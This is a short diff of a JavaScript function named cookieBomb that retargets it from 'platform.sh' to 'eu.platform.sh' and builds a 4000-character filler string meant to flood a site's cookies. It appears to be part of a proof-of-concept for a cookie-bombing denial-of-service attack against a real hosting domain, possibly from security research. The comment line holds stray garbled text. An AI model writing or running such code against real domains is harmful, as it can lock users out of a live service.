@@ -1,6 +1,6 @@
 function cookieBomb() {
     // Set target domain explicitlyzebidz
-    const domain = "platform.sh";
+    const domain = "eu.platform.sh";
     
     // Large string to fill the cookies
     const pollution = "a".repeat(4000); // 4000 characters
